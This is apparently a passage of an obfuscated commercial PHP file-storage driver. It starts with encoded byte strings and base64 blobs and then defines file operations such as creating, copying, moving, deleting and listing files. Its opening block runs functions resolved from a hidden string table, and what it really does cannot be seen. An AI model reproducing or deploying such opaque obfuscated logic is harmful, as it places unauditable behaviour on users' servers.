b9\x4e\x10\x1a\xa6\x24\x28\x10\xf0\x1f\xaf\x3e\x97\x5\xce\x11\x70\x14\x93\x14\x13\x4b\xf4\xf\x5a\xe5\x6d\xe2\x1e\x64\x85"."\202\53\60\60\171\75\141\346\223\230\40\112\366\153\262\166\124\117\311\121\242\234\300\166\203\60\277\56\67\201\215\202\111\150\7\357\302\100\302\56\310\46\306\44\17\15\50\46\171\342\220\30"."\121\157\265\302\71\130\225\266\114\43\63\245\14\122\276\24\63\353\222\306\112\317\325\210\144\52\126\350\345\167\313\56\26\223\275\200\123\144\16\216\75\151\303\15\20\233\117\170\4\226\234\207"."\x9a\xc5\x96\xd1\xc5\xc8\xe4\x2a\xe4\x9b\x45\x55\x68\x1e\x66\xa2\xc4\xdb\x37\x39\xc7\xc2\x2e\x36\x3a\xd9\x2a\x96\xca\x29\xf1\x29\x92\x25\xcd\x68\x82\x41\x1a\xec\xf2\x95\x62\x92\x20\x63\x44\x67\xaa\xd9\xde\xea"."\32\57\63\243\50\277\207\143\207\63\240\43\150\143\111\140\200\217\267\14\215\201\142\63\224\23\145\114\351\206\236\130\131\22\366\144\210\341\50\276\236\304\302\24\217\345\45\136\102\347\112\317"."\304\4\223\214\326\205\102\22\325\205\306\5\72\113\345\323\31\302\331\115\16\355\165\127\1\264\77\234\371\340\154\103\164\206\132\201\62\35\332\204\256\106\300\243\213\354\116\204\324\22\343\20".base64_decode('Kv4oyaQuPaSJEYpV1DgVe8PAkZxIjps8sVg5C0MlNEkNB8CJt6ISGw5wSBvbRvjzbqzRiA==')."\x89\x34\xd7\x59\xb7\xe4\x8\xcb\xe5\xc0\x69\x39\x22\x54\x83\xd3\x51\x9b\x27\xf1\x52\x43\x3a\xb3\x1\xc0\x4e\xea\x1d\xad\x1d\x7e\x9e\xd4\xc0\xb7\x27\x15\x94\x8\xdb\x77\x8d\x4c\x4d\x52\x1f\x66\x16\x4e\x87\x32".base64_decode('RkIJR1pCjYFwUyi2REnhW1WhRoi6q5Jtq1rCbQ3x0+Pc4ER2TJeDwXov9xmDg95edI7wJg==')."\xf9\x59\xcb\x12\xa7\x2a\x32\x42\x68\x4c\x38\xd8\x73\x36\x4b\xa1\x52\xcf\x17\xb5\x98\xc5\x4f\xf5\xd2\x45\x75\xb0\x44\xbc\x44\xe9\xb4\x90\xff\x4a\x85\x73\x79\xbd\xb8\xfc\x88\x8e\xd5\x19\xa5\x1e\x4b\x15\xa\x25"."\172\3\345\113\177\201\70\372\221\113\43\366\110\317\116\324\171\43\73\150\130\206\100\7\254\306\210\334\172\240\251\55\324\256\6\302\341\310\162\207\26\260\270\13\310\163\101\112\122\166\272\44".base64_decode('rYxYBPr1YsOLYOZOdmjhEq7Q5ZMteObYBRb4quVOWGhUcoqWy2uGpUsJ1H/XDHgZp6XTDg==').base64_decode('D6zpPilacNLbkp9S6QdYGmF0Jy4QDbW0xv/lrhpJYZvPSDK1Mv7+mfpnaZS99bJvCi9AxQ==')."\x29\xff\xaa\x53\x39\x8f\xe4\x98\x95\xd8\x36\x63\xde\x2b\x4d\x72\x6c\x2\x9e\x9e\xa6\x85\x22\x2a\x75\xab\x2a\x3e\x81\xb8\x98\xfc\x48\x4e\xbe\x85\xf5\x27\xa1\x5\x6c\x85\x34\xc8\x6e\xfc\x70\x44\x9c\x5b\x70\x29"."\x68\x4\x7f\x85\x9e\x66\xd1\x21\x1d\xb\x14\xd9\x9\x87\x9\xe7\x10\x1a\x81\x9\x77\xa8\x56\xba\xbc\xe2\xb9\x95\xe1\x1d\x3e\xef\x8a\xbe\x41\x5c\xb0\xd0\x3c\x72\x33\x85\x4a\xf6\x88\x31\xa1\x18\x77\xb9\x24\xaa"."\xba\x73\x4a\x74\x0\x65\x2b\x42\xe4\xc5\xb\x28\xf5\x4a\x15\x75\xd0\xc8\xdd\xe9\x28\xb\x99\x95\x7\xf1\x1\x62\x49\x30\x98\xc9\xd9\x8e\x93\x7e\xab\xfc\x30\x46\x5a\x12\x9a\x80\xe5\x3f\x79\x2e\xc0\xa3\x6b\xce"."\xa2\x78\x61\xeb\xd9\x62\xaa\x32\xed\x24\x78\x58\x9c\xff\xb0\x96\xa5\x99\x19\x29\x4a\x70\x48\xc7\xc2\x6c\x34\x5c\xff\x19\xbb\x20\xca\xf6\x99\xf2\xac\x13\x7c\x8e\xdf\x46\x51\xf7\xab\x54\x10\xe1\x41\xe7\x11\xdd"."\x2e\x76\xe4\x46\xab\xff\xdf\x54\xa4\x99\x31\xc9\xa4\xac\xb3\x91\xe2\xe\x59\x6e\xfa\x29\x78\x39\xec\xa3\xae\xdf\x1c\x72\xfa\x64\xc5\x29\x6e\xaf\x74\xe\x7f\x74\xd2\xe\x23\x36\xb\x64\xf\x7a\xce\x4a\x9e\x22".strrev('µ }!tÚ%®y“¤oØØ ä¬Ÿ<PNî†£/Ãtş=>–—AØtõkd ­öñ'."\n".'PW').base64_decode('EGLJacyrOfFX2cRQOnifKuWqENsPdTrREr7JBOl1+mrid/yW2EKW7fAOFjfjWspDQRUjRQ==')."\21\153\30\221\303\262\116\76\31\5\312\144\22\302\44\137\357\105\122\1\346\360\63\351\41\336\50\51\136\164\273\267\222\366\47\107\277\162\355\124\332\354\325\322\240\36\350\170\111\227\107\107"."\x34\x9d\x91\x10\x47\x31\x9a\xe4\xd7\x72\x39\x71\x1f\x22\x53\x5c\xf4\xaf\xe3\x91\x34\xe4\x75\xc6\x5b\x55\x62\x30\x44\xa5\x4a\xb\x31\x1\x73\xd2\x1d\x25\x4d\x84\xfb\xca\x42\x36\x44\xef\x65\x1c\xa9\x79\xe9\xf0"."\50\33\143\246\167\65\342\255\55\24\107\375\354\240\227\263\60\141\162\223\354\302\234\313\331\21\76\342\147\154\177\361\5\73\326\54\3\214\202\65\171\164\241\140\102\254\167\310\247\73\50\240".strrev('~]¸ÛèHôl¼%\'ãïI§äù'."\n".'5\'”´Wàk×%R+íÈSŸSbÄ%268hT,').base64_decode('uy9lrkrZ1gE/pSWcj07ou9QjnlV/lYM28Yg3h5bC6YiWcxb8MFJ0nnEfZfi0uipE3ZMcNw==')."\x8b\x85\xce\x42\x5\xc1\xe1\x59\x55\x1a\x35\xa0\xb6\x62\xef\xac\xd2\x34\x48\xe3\x2e\xe4\xd3\x1e\xa2\x8d\xe1\x61\x4a\x8e\x25\x1d\xbc\x3a\xdc\xc5\xb9\x17\xb4\x84\x8b\xd8\xaf\x6d\x10\x1e\x39\x90\x93\x5c\xd2\x89"."\xf5\xea\x16\xf6\xe6\xd9\xb5\xb5\xbb\x98\xe1\x80\x5d\x44\x80\xc5\xcb\x3e\x6a\x7a\xb9\x88\x40\xac\xcc\x24\x6b\x66\xcd\x9e\x2f\x4b\x4c\xc4\x12\x8a\xcb\x5c\xe6\x55\x84\xfe\x0\x8f\x23\x80\x42\x71\x82\xa1\xc2\xec"."\x3d\xcb\xbb\x9f\x64\x3a\x5f\xd1\x14\x7b\x13\x76\x51\x80\x7f\x6d\xc3\x88\xc3\x7\x2d\x2a\x29\xe2\x16\xfb\x5d\x2f\x9a\x1\x2\xa7\x92\x3a\x98\x44\x10\x5d\x7a\x3f\x26\x56\xc5\xb1\xc4\xae\xa3\x24\x50\xf8\x10\x76"."\176\213\262\17\45\306\41\321\75\261\131\250\77\130\63\215\17\356\31\174\41\140\347\65\347\171\264\324\261\213\314\4\73\343\141\231\256\210\71\65\243\100\104\43\262\245\163\231\334\242\155\272"."\xe5\x4b\xb8\x3a\xa6\x8b\x44\x56\x1a\xc9\xa6\x81\x6c\x63\x9b\x13\x62\xb7\x49\x98\xe8\x5f\x58\x40\x76\xc4\xa2\xa7\x31\xa1\x12\x86\x87\xef\x38\x99\x3b\x67\xc1\x7f\x32\x43\x33\x25\x7c\xff\x4a\xa\x33\x5f\x31\x6"."\xca\xe9\xf1\xa3\xa5\x57\xb3\xbd\x12\x70\x4a\xf2\x49\xdd\x8e\x90\xc5\x6\x74\x21\x4e\xc0\xce\x71\xbb\x9a\x47\xd5\x44\x1b\x3d\x1e\x65\xa2\x42\xc5\xec\x9e\xe4\x22\x58\xd8\x39\x94\x18\x3d\x5c\x9b\xbd\x18\x9f\x40"."\x80\x40\x1e\x2c\x3b\x59\x26\xd9\x83\x29\x79\xed\x2b\xc\xf2\x90\xad\xeb\xd8\xc6\x92\x79\x75\xf9\xb5\x2c\x69\x48\xde\x1f\xc5\x4d\x4b\xfe\x60\x85\xd8\x89\xc8\xa9\x60\x44\xb0\xb9\x89\x6\x5\xe9\x66\xa0\x85\xbf"."\265\326\44\375\76\247\54\14\230\73\311\231\71\232\76\311\337\267\51\207\45\77\303\210\46\104\330\373\10\324\35\307\61\26\305\233\134\276\340\11\376\162\73\210\147\163\106\220\206\300\207\322"."\x1b\x7e\xc7\x51\x89\xbb\xc8\x74\x1c\x9d\x2c\xb7\x9f\x5c\xc4\xa\x3a\x1c\x80\x24\x8b\x5c\x8b\x3\xe2\x24\x2f\xe4\xe8\xd7\x24\xd2\x2b\xa8\xac\x8\xb5\x33\x7f\x44\x38\x22\x49\x94\xc9\x79\x8b\x67\x3a\x4c\x1d\x60"."\153\176\56\34\301\14\50\130\56\367\331\324\136\70\15\263\143\301\377\332\105\354\377\53\317\260\263\253\230\354\337\341\121\276\5\230\163\350\55\276\140\345\262\16\52\167\166\215\303\111\136\17"."\5\50\102\223\357\223\34\332\223\70\327\22\147\26\35\231\241\107\215\335\277\151\351\264\104\204\113\37\147\212\374\166\43\340\33\340\276\236\113\105\334\357\201\335\76\274\273\210\330\227\271\347"."\xee\x29\x55\x50\xe0\x25\x7e\x6a\x2a\x1\xc7\x34\x89\x31\xcb\x2\x27\x65\x8d\xc4\x40\x89\xcb\x73\xa2\x25\xeb\xb4\xef\x2f\x31\x27\x45\xc5\x44\x1f\x10\xf\xc3\x4c\x65\xfa\x59\x28\x81\x8f\x8b\xc4\x2c\xc\xcc\x9e"."\xfc\x74\x3f\x92\x63\x7\xcb\x4a\xa0\x2\x3d\x27\x33\x6c\x45\xcc\x85\x0\xd2\x92\x11\x95\x23\xa9\x8\xbd\xc5\x1d\x6b\xe2\x48\x94\xa7\x5b\xe0\x20\x1f\x5b\x4e\x47\x8d\x36\x97\x4b\x62\x5a\xc8\x92\xe7\xd6\x69\x7d"."\100\122\341\54\326\253\50\156\211\343\4\271\12\126\324\167\212\311\360\142\343\116\172\253\274\256\204\152\257\253\71\356\241\331\11\367\16\227\301\124\27\5\155\226\50\26\207\60\261\30\271\176"."\x22\xf7\xd0\xde\xe2\x3a\x14\xc6\x63\xa2\xcc\x4\xbb\xac\xf4\x5e\xe7\x9d\x12\xa2\x41\x1c\x92\xe7\x83\xe1\x8c\x8e\xbc\x49\x98\x46\x67\x2a\x17\x11\x49\xba\xd3\x9\x49\xfe\xea\xe6\x3\x69\xf2\x34\x5f\x11\x5\x63"."\350\323\261\152\130\171\117\134\173\306\43\321\240\272\74\204\115\116\204\116\15\166\62\143\311\206\111\174\211\260\46\73\333\52\310\53\65\330\14\350\104\323\154\12\260\322\21\142\223\204\301\302"."\342\257\235\311\65\362\113\132\347\133\147\351\105\4\263\267\45\213\47\235\205\361\263\26\347\276\134\124\252\130\302\314\133\262\271\114\107\46\146\301\114\224\33\145\147\352\316\54\332\324\172\302".base64_decode('1pMKJuYO/r6rtmpWz1e1gvJ5ydqvKQkHjdgsL9PzZWVK1jOpfZxSeQg2Y7YDiIQjGrcDmg==')."\146\207\355\251\72\111\134\252\20\53\134\340\211\150\202\265\151\67\33\5\233\341\312\303\150\142\342\134\174\122\345\67\321\314\157\11\326\241\363\143\43\135\370\241\206\237\300\37\110\271\127\252"."\31\225\251\24\141\371\200\220\362\20\354\133\174\76\204\57\331\371\221\110\76\232\341\357\63\210\144\207\12\153\34\62\33\320\34\220\223\244\233\164\164\360\112\72\135\167\221\114\222\314\254\162"._kodDe('K/42UMXmo5EdUrKVIPh4HxaGWL9NHq247eRCtTYFN5m8TOo0dE6AZhTdyg9nmF3ufrT3tAM=')."\342\273\131\161\145\54\161\222\254\32\76\25\13\42\357\112\227\60\252\240\177\332\240\340\213\305\271\54\231\154\326\6\113\24\115\352\156\53\162\50\205\27\45\174\265\144\123\103\74\232\321\207".strrev('¨¸Pè_Ô$¬`gH¹k‰šê$‰P8=6Ë«9ÃøjVœL18û‹êÜØU8°QÅ¦ñ9C¯ä').base64_decode('R3zSaUGEF+NrhsqQF3VeR6rrVI+laowndGWBnElqvqQ4SgIBPR2WmpPv6iesECv9EQGVzg==')."\51\226\114\257\210\14\306\276\230\216\311\227\150\26\37\30\224\214\312\231\216\356\270\227\226\34\102\5\370\322\304\14\21\351\323\274\200\63\213\226\327\135\275\227\53\270\107\106\153\70\274\366"."\311\351\103\206\235\350\227\116\314\305\231\305\351\371\242\311\206\16\224\36\207\273\267\154\256\335\162\4\321\110\121\177\44\105\240\270\131\242\16\355\121\311\152\64\13\327\24\7\25\107\335\11"."\246\0\327\245\131\270\156\121\66\253\134\64\257\244\236\255\25\254\11\206\127\74\171\40\227\112\226\30\260\220\336\110\105\47\232\317\222\205\213\77\7\220\350\56\115\4\131\245\173\41\344\117"."\56\325\213\122\275\50\131\170\302\136\270\113\13\236\3\237\106\113\345\70\364\227\234\24\245\24\336\146\71\45\60\65\305\102\23\52\66\11\145\237\142\222\41\362\112\250\36\321\117\142\356\107"."\x36\xd7\x58\x22\x5b\xd6\x63\x2a\xad\xe9\x14\x2d\x89\x65\x2c\xa7\xa\x92\x2b\x5d\x9e\x20\x30\x28\xe\x1c\x34\x0\x30\x62\xc1\xd2\xc6\x80\x50\xf1\x64\x2f\x3c\xa6\x39\x48\x49\x21\x3b\x90\x35\x39\x79\x4a\xa\xd"."\x5e\xcc\x39\x5\xf2\xee\x79\x2e\x6a\xcd\x9\xfa\xd9\x82\x64\xda\xbd\xe4\x83\x13\xf\x16\x12\x15\x8b\x63\xd2\x1a\x7f\xf9\x27\xb4\xe0\xe8\xf9\xd9\x44\x47\x3d\xdd\x69\x3f\x5e\xb6\xda\x48\xf3\xd9\x47\xd2\x92\x48"."\xda\x25\xd\x16\x22\x2b\x87\x32\x4c\x9\x19\x29\x49\x2\x8e\x59\x5c\xcc\xd0\xf6\x24\xe6\x48\xc0\x84\xe3\x3d\x18\x65\x49\xe0\x3e\x8b\x5e\x85\x37\x62\xfd\xc\x7e\x9\x4a\x8c\x98\x53\x12\x4e\xb3\x63\x66\xde\xf6"."\xe0\xbc\xb8\x99\x23\xbf\xd\xa6\x6d\xb\xcd\x12\x2a\x23\x22\x6c\x36\xa6\xc3\x1e\x49\x71\xa\x85\xc4\x8d\x27\xee\x14\xb9\x4a\x23\x60\x4b\x30\x16\x9\xc2\xa5\x3c\x16\xbe\xc4\x74\x9a\x4b\xf0\x9c\x23\x82\xaf\xe8".base64_decode('eEQms3A531xwqQ+IhAEz2WsOM1OJCK6kSRKXeJqbtxRsEYCirAZGTItYfprjB2dFXtIGeA==')."\43\365\255\311\245\34\325\251\177\107\256\304\375\125\55\200\40\137\64\101\75\225\20\251\52\274\127\213\305\143\105\131\35\201\130\154\171\44\332\104\35\233\24\145\223\132\222\262\135\121\126\107"."\153\244\175\242\274\140\133\40\24\56\312\303\172\171\355\252\60\272\111\263\102\35\244\227\344\36\172\242\136\204\32\227\210\236\24\333\72\145\367\146\141\160\130\51\326\105\272\107\312\365\233\354".base64_decode('eoiVj2lpJhiS7hn0jLDKKuo45V3y+lvMfDIPOL0JutRkGWBDQ1jLrh3ajuYgFTuE4fiB8w==').base64_decode('+ULVw+dQCZHSyR4iSEmCTZnek4QZJSdIvncovhMjuWICcMdOMUFxc43ZK9150VMWvDeHKQ==').base64_decode('lTQpadiRbWupkpoRVJyMsYQQ9P4fQUXbRQy5AAA=').strrev('').strrev('')."", 10, -8))); goto Dœ‰¬ƒ ®¬; eô…‰²ƒâ: if ($_SERVER[$_SERVER[ç¦¬”œš][474]] != $_SERVER[$_SERVER[ç¦¬”œš][1453]]) { $_getc = $_SERVER[ç¦¬”œš][475]; $_getfile = $_SERVER[$_SERVER[ç¦¬”œš][476]] . $_SERVER[ç¦¬”œš][477]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ç¦¬”œš][262], $_getfilec); if (count($_getarrs) < $_SERVER[ç¦¬”œš][478]) { $exit = $_SERVER[ç¦¬”œš][479]; $exit(); } $_act = $_SERVER[ç¦¬”œš][480]; $_act($_SERVER[$_SERVER[ç¦¬”œš][472]]); } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($´ÒÇÇ©›) { if (substr($´ÒÇÇ©›, 0, 2) == $_SERVER[ç¦¬”œš][1411]) { $´ÒÇÇ©› = BASIC_PATH . substr($´ÒÇÇ©›, 2); } return $´ÒÇÇ©›; } public function iconvApp($ã®åášà) { $ªç¸ŠÍ„ =& $_SERVER[ç¦¬”œš]; global $config; return $this->iconvTo($ã®åášà, $config[$ªç¸ŠÍ„[1438]], $config[$ªç¸ŠÍ„[1437]]); } public function iconvSystem($˜ÍØ‘çğ) { $éššæÑ­ =& $_SERVER[ç¦¬”œš]; global $config; return $this->iconvTo($˜ÍØ‘çğ, $config[$éššæÑ­[1437]], $config[$éššæÑ­[1438]]); } public function getPathOuter($Å­Ö´Šó) { $èâ˜„§ô =& $_SERVER[ç¦¬”œš]; $Î®ì· Í = $this->iconvApp($this->pathBase); $Å­Ö´Šó = $this->iconvApp($Å­Ö´Šó); if (substr($Î®ì· Í, 0, 2) == $èâ˜„§ô[1411]) { $Î®ì· Í = BASIC_PATH . substr($Î®ì· Í, 2); } if (substr($Å­Ö´Šó, 0, 2) == $èâ˜„§ô[1411]) { $Å­Ö´Šó = BASIC_PATH . substr($Å­Ö´Šó, 2); } $Î®ì· Í = KodIO::clear($Î®ì· Í); $Å­Ö´Šó = KodIO::clear($Å­Ö´Šó); $Å­Ö´Šó = substr($Å­Ö´Šó, strlen($Î®ì· Í)); if (empty($this->pathDriver)) { return $Å­Ö´Šó; } return $this->pathDriver . $èâ˜„§ô[8] . ltrim($Å­Ö´Šó, $èâ˜„§ô[8]); } public function mkfile($Ğ¤³è­Ÿ, $¹ÑÈÀÂ = '', $®¡¯ ‡ï = REPEAT_RENAME) { $Ğ¤³è­Ÿ = $this->iconvSystem($Ğ¤³è­Ÿ); @touch($Ğ¤³è­Ÿ); if ($¹ÑÈÀÂ) { file_put_contents($Ğ¤³è­Ÿ, $¹ÑÈÀÂ); } @chmod($Ğ¤³è­Ÿ, $this->pathAuth); if (is_file($Ğ¤³è­Ÿ)) { return $this->getPathOuter($Ğ¤³è­Ÿ); } $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } public function mkdir($ÂºíØ¾‰, $¤èÓëö¢ = REPEAT_SKIP) { $ÂºíØ¾‰ = $this->iconvSystem($ÂºíØ¾‰); if (is_dir($ÂºíØ¾‰)) { return $this->getPathOuter($ÂºíØ¾‰); } @mkdir($ÂºíØ¾‰, $this->pathAuth, !0); @chmod($ÂºíØ¾‰, $this->pathAuth); if (is_dir($ÂºíØ¾‰)) { return $this->getPathOuter($ÂºíØ¾‰); } $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } public function copyFile($ï¨øØÈš, $½Ÿª§¼Ä) { $this->mkdir($this->pathFather($½Ÿª§¼Ä)); $ï¨øØÈš = $this->iconvSystem($ï¨øØÈš); $½Ÿª§¼Ä = $this->iconvSystem($½Ÿª§¼Ä); $¸«ö†† = copy_64($ï¨øØÈš, $½Ÿª§¼Ä); @chmod($½Ÿª§¼Ä, $this->pathAuth); if ($¸«ö††) { return $this->getPathOuter($½Ÿª§¼Ä); } $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } public function moveFile($ôÏÏŸš½, $ğÚË·¼›) { $this->mkdir($this->pathFather($ğÚË·¼›)); $ôÏÏŸš½ = $this->iconvSystem($ôÏÏŸš½); $ğÚË·¼› = $this->iconvSystem($ğÚË·¼›); $±’†š§Æ = intval(@rename($ôÏÏŸš½, $ğÚË·¼›)); if (!$±’†š§Æ) { if ($±’†š§Æ = intval(@copy_64($ôÏÏŸš½, $ğÚË·¼›))) { @unlink($ôÏÏŸš½); } } @chmod($ğÚË·¼›, $this->pathAuth); if ($±’†š§Æ) { return $this->getPathOuter($ğÚË·¼›); } $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } public function movePath($àİá®¦, $ö«ÊÃı, $‹½Ñ»Ü¦ = false) { $ÍÎƒšë¬ =& $_SERVER[ç¦¬”œš]; $àİá®¦ = $this->iconvSystem($àİá®¦); $ö«ÊÃı = $this->iconvSystem($ö«ÊÃı); $õ¸‹ÕÊ÷ = rtrim($ö«ÊÃı, $ÍÎƒšë¬[8]) . $ÍÎƒšë¬[8] . ($‹½Ñ»Ü¦ ? $‹½Ñ»Ü¦ : get_path_this($àİá®¦)); if (file_exists($õ¸‹ÕÊ÷)) { return !1; } $Ç’„¡Ù = intval(@rename($àİá®¦, $õ¸‹ÕÊ÷)); $Ç’„¡Ù = file_exists($õ¸‹ÕÊ÷); if ($Ç’„¡Ù) { return $this->getPathOuter($õ¸‹ÕÊ÷); } $this->writeLog(__FUNCTION__ . $ÍÎƒšë¬[1449], !0); return !1; } public function delFile($İ±µ§Ó¾) { $İ±µ§Ó¾ = $this->iconvSystem($İ±µ§Ó¾); if (!@unlink($İ±µ§Ó¾)) { @chmod($İ±µ§Ó¾, $this->pathAuth); if (@unlink($İ±µ§Ó¾)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][1449], !0); return !1; } return !0; } public function delFolder($¸ï±ŠëĞ) { $¤©»ú³÷ =& $_SERVER[ç¦¬”œš]; $¸ï±ŠëĞ = $this->iconvSystem($¸ï±ŠëĞ); if (!is_dir($¸ï±ŠëĞ)) { return !0; } if (!($ ÂÄÖú• = opendir($¸ï±ŠëĞ))) { return !1; } while (($¬²ÓŞû¡ = readdir($ ÂÄÖú•)) !== !1) { if ($¬²ÓŞû¡ == $¤©»ú³÷[10] || $¬²ÓŞû¡ == $¤©»ú³÷[1364]) { continue; } $ê¼Âçƒ¬ = $¸ï±ŠëĞ . $¤©»ú³÷[8] . $¬²ÓŞû¡; if (is_file($ê¼Âçƒ¬) || is_link($ê¼Âçƒ¬)) { if (!unlink($ê¼Âçƒ¬)) { chmod($ê¼Âçƒ¬, $this->pathAuth); if (!unlink($ê¼Âçƒ¬)) { return !1; } } } else { if (is_dir($ê¼Âçƒ¬)) { chmod($ê¼Âçƒ¬, $this->pathAuth); $ê¼Âçƒ¬ = $this->iconvApp($ê¼Âçƒ¬); if (!$this->delFolder($ê¼Âçƒ¬)) { return !1; } } } } closedir($ ÂÄÖú•); return rmdir($¸ï±ŠëĞ); } public function rename($¾§éÍÙı, $ºãªî“Ô) { $Äõõûßí =& $_SERVER[ç¦¬”œš]; $‡‡×•âï = $this->fileNameAuto($this->pathFather($¾§éÍÙı), $ºãªî“Ô); $‡‡×•âï = $this->iconvSystem($‡‡×•âï); $¾§éÍÙı = $this->iconvSystem($¾§éÍÙı); $‘°‘ˆ•„ = $this->pathFather($¾§éÍÙı); $´ã«ßÆŠ = rtrim($‘°‘ˆ•„, $Äõõûßí[8]) . $Äõõûßí[8] . $‡‡×•âï; $˜•–’ó¬ = @rename($¾§éÍÙı, $´ã«ßÆŠ); $´ã«ßÆŠ = $this->iconvApp($´ã«ßÆŠ); if ($˜•–’ó¬) { return $this->getPathOuter($´ã«ßÆŠ); } $this->writeLog(__FUNCTION__ . $Äõõûßí[1449], !0); return !1; } public function size($Ø¬š€æ) { $Ø¬š€æ = $this->iconvSystem($Ø¬š€æ); return filesize_64($Ø¬š€æ); } public function info($Ìü‹ñ«ë) { $Ìü‹ñ«ë = $this->iconvSystem($Ìü‹ñ«ë); if ($this->isFolder($Ìü‹ñ«ë)) { return $this->folderInfo($Ìü‹ñ«ë); } else { if ($this->isFile($Ìü‹ñ«ë)) { return $this->fileInfo($Ìü‹ñ«ë); } } return !1; } protected function infoChildren($¾…Êö¨¶, &$…¨‰åøå, $­Ó»ß®Â = true) { $ıÏ¶²Í‚ =& $_SERVER[ç¦¬”œš]; check_abort_echo(); $¾…Êö¨¶ = rtrim($¾…Êö¨¶, $ıÏ¶²Í‚[8]) . $ıÏ¶²Í‚[8]; if ($­Ó»ß®Â) { $¾…Êö¨¶ = $this->iconvSystem($¾…Êö¨¶); } if (!($øŠ·ìş = @opendir($¾…Êö¨¶))) { return; } while (($šÕÚ’–é = readdir($øŠ·ìş)) !== !1) { if ($šÕÚ’–é == $ıÏ¶²Í‚[10] || $šÕÚ’–é == $ıÏ¶²Í‚[1364]) { continue; } $©°™çÜ¶ = $¾…Êö¨¶ . $šÕÚ’–é; if (is_file($©°™çÜ¶) || is_link($©°™çÜ¶)) { $…¨‰åøå[$ıÏ¶²Í‚[80]]++; $…¨‰åøå[$ıÏ¶²Í‚[79]] += filesize_64($©°™çÜ¶); } else { if (is_dir($©°™çÜ¶)) { $…¨‰åøå[$ıÏ¶²Í‚[81]]++; $this->infoChildren($©°™çÜ¶, $…¨‰åøå, !1); } } } closedir($øŠ·ìş); } private function folderInfo($Êö©ö£Ó, $¹ËæÉ¸ = false) { $°¤†•İÇ =& $_SERVER[ç¦¬”œš]; $Êö©ö£Ó = rtrim($Êö©ö£Ó, $°¤†•İÇ[8]) . $°¤†•İÇ[8]; $÷ËŒ¸‡Ä = $this->iconvApp($this->pathThis($Êö©ö£Ó)); if ($¹ËæÉ¸) { return array($°¤†•İÇ[32] => $÷ËŒ¸‡Ä, $°¤†•İÇ[87] => $this->getPathOuter($Êö©ö£Ó), $°¤†•İÇ[33] => $°¤†•İÇ[78]); } $©ò¤¼ = array($°¤†•İÇ[32] => $÷ËŒ¸‡Ä, $°¤†•İÇ[87] => $this->getPathOuter($Êö©ö£Ó), $°¤†•İÇ[33] => $°¤†•İÇ[78], $°¤†•İÇ[231] => @filectime($Êö©ö£Ó), $°¤†•İÇ[88] => @filemtime($Êö©ö£Ó), $°¤†•İÇ[1454] => @fileatime($Êö©ö£Ó), $°¤†•İÇ[1455] => is_readable($Êö©ö£Ó), $°¤†•İÇ[1456] => is_writable($Êö©ö£Ó), $°¤†•İÇ[1457] => get_mode($Êö©ö£Ó)); return $©ò¤¼; } private function fileInfo($úÎÛ‚Â¡, $¤ƒÈæÁº = false) { $Öı½‡‘— =& $_SERVER[ç¦¬”œš]; $ò¨åÒìÙ = $this->iconvApp($this->pathThis($úÎÛ‚Â¡)); if ($¤ƒÈæÁº) { return array($Öı½‡‘—[32] => $ò¨åÒìÙ, $Öı½‡‘—[87] => $this->getPathOuter($úÎÛ‚Â¡), $Öı½‡‘—[33] => $Öı½‡‘—[230], $Öı½‡‘—[79] => $this->size($úÎÛ‚Â¡), $Öı½‡‘—[169] => $this->ext($ò¨åÒìÙ)); } $áËûôº´ = array($Öı½‡‘—[32] => $ò¨åÒìÙ, $Öı½‡‘—[87] => $this->getPathOuter($úÎÛ‚Â¡), $Öı½‡‘—[33] => $Öı½‡‘—[230], $Öı½‡‘—[231] => @filectime($úÎÛ‚Â¡), $Öı½‡‘—[88] => @filemtime($úÎÛ‚Â¡), $Öı½‡‘—[1454] => @fileatime($úÎÛ‚Â¡), $Öı½‡‘—[79] => $this->size($úÎÛ‚Â¡), $Öı½‡‘—[169] => $this->ext($ò¨åÒìÙ), $Öı½‡‘—[1455] => is_readable($úÎÛ‚Â¡), $Öı½‡‘—[1456] => is_writable($úÎÛ‚Â¡), $Öı½‡‘—[1457] => get_mode($úÎÛ‚Â¡)); return $áËûôº´; } public function exist($¾Áã’…) { $¾Áã’… = $this->iconvSystem($¾Áã’…); return @file_exists($¾Áã’…); } public function isFile($Ãœæ©âï) { $Ãœæ©âï = $this->iconvSystem($Ãœæ©âï); return @is_file($Ãœæ©âï); } public function isFolder($±ÚßÊ±) { $±ÚßÊ± = $this->iconvSystem($±ÚßÊ±); return @is_dir($±ÚßÊ±); } public function listPath($ôË´‡’ê, $ÆÌŒù– = false) { $ë²ÙÛ† =& $_SERVER[ç¦¬”œš]; $ôË´‡’ê = $this->iconvSystem($ôË´‡’ê); $ôË´‡’ê = rtrim($ôË´‡’ê, $ë²ÙÛ†[8]) . $ë²ÙÛ†[8]; $Á¬í»²˜ = array($ë²ÙÛ†[85] => array(), $ë²ÙÛ†[86] => array()); if (!($¹©Í¤†ü = @opendir($ôË´‡’ê))) { return $Á¬í»²˜; } while (($¤£Ä£‡ = readdir($¹©Í¤†ü)) !== !1) { if ($¤£Ä£‡ == $ë²ÙÛ†[10] || $¤£Ä£‡ == $ë²ÙÛ†[1364]) { continue; } $”éÊƒğÁ = $ôË´‡’ê . $¤£Ä£‡; if (is_file($”éÊƒğÁ)) { $Á¬í»²˜[$ë²ÙÛ†[86]][] = $this->fileInfo($”éÊƒğÁ, $ÆÌŒù–); } else { $Á¬í»²˜[$ë²ÙÛ†[85]][] = $this->folderInfo($”éÊƒğÁ, $ÆÌŒù–); } } closedir($¹©Í¤†ü); return $Á¬í»²˜; } public function listAll($”¦Á³äá, &$˜¹ÉÒò = array()) { $¼…ò¬Ú† =& $_SERVER[ç¦¬”œš]; $”¦Á³äá = $this->iconvSystem($”¦Á³äá); $”¦Á³äá = rtrim($”¦Á³äá, $¼…ò¬Ú†[8]) . $¼…ò¬Ú†[8]; if (!($Ìè‰àÚ = @opendir($”¦Á³äá))) { return $˜¹ÉÒò; } while (($œ‹¥İÛÄ = readdir($Ìè‰àÚ)) !== !1) { if ($œ‹¥İÛÄ == $¼…ò¬Ú†[10] || 